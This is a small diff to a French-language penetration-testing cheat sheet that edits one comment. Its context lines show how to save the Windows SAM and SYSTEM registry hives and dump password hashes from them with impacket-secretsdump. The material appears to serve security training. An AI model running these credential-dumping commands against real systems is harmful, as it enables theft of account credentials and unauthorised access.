@@ -686,7 +686,7 @@ reg save HKLM\SYSTEM C:\temp\SYSTEM
 **Extraire les hashes**
 
 ```bash
-# Transférer les fichiers sur Kali
+# Transférer les fichiers sur Kali puis dump les hashs
 impacket-secretsdump -sam SAM -system SYSTEM LOCAL
 ```
 
